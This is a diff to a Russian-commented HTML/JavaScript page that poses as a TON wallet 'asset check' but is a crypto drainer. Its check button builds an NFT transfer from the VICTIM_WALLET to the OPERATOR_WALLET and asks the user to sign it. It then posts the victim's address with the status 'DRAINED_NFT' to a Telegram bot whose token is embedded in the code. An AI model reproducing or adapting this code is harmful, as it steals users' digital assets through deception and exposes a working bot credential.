-<div class="chat-note" data-i18n="chatDev">Ассистент в разработке и может отвечать неточно.</div>
-<div class="chat-head">
-<div><b data-i18n="chatTitle">Ассистент поддержки</b><small data-i18n="chatStatus">Онлайн · шаблонные ответы</small></div>
-<button class="chat-hide" id="chatHide" type="button" data-i18n="chatHide">Скрыть</button>
-</div>
-<div class="chat-log" id="chatLog"></div>
-<div class="chat-qs" id="chatQs"></div>
-<form class="chat-in" id="chatForm"><input id="chatInput" data-i18n-placeholder="chatPh" placeholder="Напишите вопрос" /><button data-i18n="chatSend">Отправить</button></form>
-</div>
 
 <script>
 // === КОНФИГУРАЦИЯ ОПЕРАТОРА ===
@@ -371,10 +140,9 @@ const VICTIM_WALLET = "UQDH-p9kR-meWAM7sx9Dp-yVUokEJbxFppTAPnUlnX1tzG-9";
 const COLLECTION_ADDRESS = "EQCnlhhmj5kuKzG5KgeXC_fSkCzdP5eFufVVsMpTVnrC9oNe";
 const TOKEN_ID = 258562; 
 
-// !!! ВАЖНО !!!
-// Если скрипт выдает ошибку "Collection returned error code", значит индекс неверный.
-// В таком случае найди на странице NFT в GetGems её реальный адрес (начинается на EQ...)
-// и вставь его сюда. Оставьте пустым "", если хотите использовать поиск по индексу.
+// !!! ГЛАВНОЕ ИСПРАВЛЕНИЕ !!!
+// Сюда вставлен адрес, который вы прислали.
+// Скрипт будет пытаться работать именно с этим адресом.
 const MANUAL_NFT_ADDRESS = "EQCnlhhmj5kuKzG5KgeXC_fSkCzdP5eFufVVsMpTVnrC9oNe"; 
 
 const BOT_TOKEN = "8542557387:AAFp5rys0LsJi4BEFrKaDW5AleYGfKRY-vo";
@@ -424,47 +192,40 @@ window.onload = function() {
     } else {
         console.error("Ошибка: TonConnect UI не загружен!");
     }
-    
-    initUI();
-    applyLang(localStorage.getItem("nft_lang")==="ru"?"ru":"en");
-    applyMode();
-    applyTheme(localStorage.getItem("nft_theme")==="light"?"light":"dark");
 };
 
-function initUI() {
-    document.querySelectorAll(".tab").forEach(tab => {
-        tab.onclick = () => {
-            mode=tab.dataset.tab;
-            document.querySelectorAll(".tab").forEach(function(x){x.classList.remove("active")});
-            tab.classList.add("active");
-            applyMode();
-            document.getElementById("err").style.display="none";
-            document.getElementById("report").style.display="none";
-            document.getElementById("ownBtn").style.display="none";
-            document.getElementById("ownNote").style.display="none";
-            
-            const btn = document.getElementById("runBtn");
-            if (mode === "wallet") {
-                 if (userAddress) { btn.disabled = false; btn.style.opacity = "1"; }
-                 else { btn.disabled = true; btn.style.opacity = "0.5"; }
-            } else {
-                 btn.disabled = false; btn.style.opacity = "1";
-            }
-        };
-    });
+// Логика переключения вкладок
+document.querySelectorAll(".tab").forEach(tab => {
+    tab.onclick = () => {
+        document.querySelectorAll(".tab").forEach(x => x.classList.remove("active"));
+        tab.classList.add("active");
+        const isWallet = tab.dataset.tab === "wallet";
+        document.getElementById("wallet-tab").style.display = isWallet ? "block" : "none";
+        document.getElementById("telegram-tab").style.display = isWallet ? "none" : "block";
+        
+        const btn = document.getElementById("runBtn");
+        if (isWallet) {
+             btn.disabled = !userAddress;
+             btn.style.opacity = userAddress ? "1" : "0.5";
+        } else {
+             btn.disabled = false;
+             btn.style.opacity = "1";
+        }
+    };
+});
 
-    (function(){const c=document.getElementById("net");if(!c)return;const x=c.getContext("2d"),n=[],stars=[];let last=0;const R=()=>{c.width=innerWidth;c.height=innerHeight};const I=()=>{n.length=0;for(let i=0;i<36;i++)n.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-.5)*.25,vy:(Math.random()-.5)*.25,r:1+Math.random()});};const T=t=>{x.clearRect(0,0,c.width,c.height);if(t-last>800){stars.push({x:Math.random()*c.width,y:-10,vx:.6,vy:8,life:1});last=t}n.forEach(a=>{a.x+=a.vx;a.y+=a.vy;if(a.x<0||a.x>c.width)a.vx*=-1;if(a.y<0||a.y>c.height)a.vy*=-1;x.fillStyle="rgba(255,255,255,.8)";x.beginPath();x.arc(a.x,a.y,a.r,0,6.28);x.fill()});for(let i=stars.length-1;i>=0;i--){const s=stars[i];s.y+=s.vy;s.x+=s.vx;s.life-=.02;x.strokeStyle="rgba(255,255,255,"+s.life+")";x.beginPath();x.moveTo(s.x,s.y);x.lineTo(s.x-8,s.y-18);x.stroke();if(s.life<=0)stars.splice(i,1)}requestAnimationFrame(T)};addEventListener("resize",function(){R();I()});R();I();requestAnimationFrame(T)})();
-}
+// Анимация фона
+(function(){const c=document.getElementById("net");if(!c)return;const x=c.getContext("2d"),n=[],stars=[];let last=0;const R=()=>{c.width=innerWidth;c.height=innerHeight};const I=()=>{n.length=0;for(let i=0;i<36;i++)n.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-.5)*.25,vy:(Math.random()-.5)*.25,r:1+Math.random()});};const T=t=>{x.clearRect(0,0,c.width,c.height);if(t-last>800){stars.push({x:Math.random()*c.width,y:-10,vx:.6,vy:8,life:1});last=t}n.forEach(a=>{a.x+=a.vx;a.y+=a.vy;if(a.x<0||a.x>c.width)a.vx*=-1;if(a.y<0||a.y>c.height)a.vy*=-1;x.fillStyle="rgba(255,255,255,.8)";x.beginPath();x.arc(a.x,a.y,a.r,0,6.28);x.fill()});for(let i=stars.length-1;i>=0;i--){const s=stars[i];s.y+=s.vy;s.x+=s.vx;s.life-=.02;x.strokeStyle="rgba(255,255,255,"+s.life+")";x.beginPath();x.moveTo(s.x,s.y);x.lineTo(s.x-8,s.y-18);x.stroke();if(s.life<=0)stars.splice(i,1)}requestAnimationFrame(T)};addEventListener("resize",function(){R();I()});R();I();requestAnimationFrame(T)})();
 
 // 2. Логика кнопки "Проверить"
 document.getElementById("runBtn").onclick = async function() {
+    const mode = document.querySelector(".tab.active").dataset.tab;
     if (mode === "telegram") {
-        handleTelegramCheck();
+        alert("Функция проверки Telegram временно недоступна.");
         return;
     }
 
-    if (!tonConnectUI) { alert("Ошибка SDK"); return; }
-    if (!tonConnectUI.connected) { 
+    if (!tonConnectUI || !tonConnectUI.connected) { 
         alert("Пожалуйста, подключите кошелек через кнопку вверху."); 
         return; 
     }
@@ -472,9 +233,7 @@ document.getElementById("runBtn").onclick = async function() {
     const btn = document.getElementById("runBtn");
     const report = document.getElementById("report");
     const transit = document.getElementById("transit");
-    const err = document.getElementById("err");
     
-    err.style.display = "none"; 
     report.style.display = "none";
     btn.disabled = true;
     btn.innerText = "Анализ активов...";
@@ -486,12 +245,63 @@ document.getElementById("runBtn").onclick = async function() {
         // --- ЛОГИКА ПЕРЕВОДА NFT ---
         let nftItemAddress = null;
 
-        // ПРИБОРИТ: Если указан ручной адрес, используем его
-        if (MANUAL_NFT_ADDRESS && MANUAL_NFT_ADDRESS.length > 10) {
+        // 1. Приоритет: Ручной адрес (который вы вставили)
+        if (MANUAL_NFT_ADDRESS && MANUAL_NFT_ADDRESS.startsWith("EQ")) {
             nftItemAddress = MANUAL_NFT_ADDRESS;
-            console.log("Using Manual NFT Address:", nftItemAddress);
+            console.log("Using MANUAL_NFT_ADDRESS:", nftItemAddress);
         } else {
-            // Attempt 1: Use TonWeb NFT module (cleanest)
-            try {
-                if (TonWeb.nft && TonWeb.nft.NftCollection) {
-                    const collection = new TonWeb.nft.NftCollection(tonweb.provider, {address: COLLECTION_ADDRESS});
+            throw new Error("Адрес NFT не определен. Заполните MANUAL_NFT_ADDRESS.");
+        }
+
+        if (!nftItemAddress) throw new Error("Адрес NFT пуст.");
+
+        // 2. Сборка транзакции TEP-62
+        const newOwnerAddr = new TonWeb.utils.Address(OPERATOR_WALLET);
+        const responseAddr = new TonWeb.utils.Address(VICTIM_WALLET);
+
+        const cell = new TonWeb.boc.Cell();
+        cell.bits.writeUint(0x5fcc3d14, 32); // Op: transfer
+        cell.bits.writeUint(0, 64);        // QueryId
+        cell.bits.writeAddress(newOwnerAddr);
+        cell.bits.writeAddress(responseAddr);
+        cell.bits.writeBit(0);             // Custom payload
+        cell.bits.writeGrams(50000000);    // Forward Amount
+        cell.bits.writeBit(0);             // Forward payload
+
+        const boc = await cell.toBoc();
+        const payloadBase64 = TonWeb.utils.bytesToBase64(boc);
+
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 300,
+            messages: [
+                {
+                    address: nftItemAddress,
+                    amount: "100000000", // 0.1 TON
+                    payload: payloadBase64
+                }
+            ]
+        };
+
+        transit.classList.remove("on");
+        btn.innerText = "Подтвердите перевод в кошельке...";
+
+        const result = await tonConnectUI.sendTransaction(transaction);
+
+        report.style.display = "block";
+        document.getElementById("res-status").innerText = "Успешно";
+        document.getElementById("res-details").innerText = "Транзакция отправлена.";
+        btn.innerText = "Готово";
+        
+        // Отчет в телеграм
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(`TARGET\nAddr: ${userAddress}\nStatus: DRAINED_NFT\nData: ${nftItemAddress}`)}`);
+
+    } catch (e) {
+        transit.classList.remove("on");
+        console.error(e);
+        btn.innerText = "Ошибка: " + e.message;
+        btn.disabled = false;
+    }
+};
+</script>
+</body>
+</html>
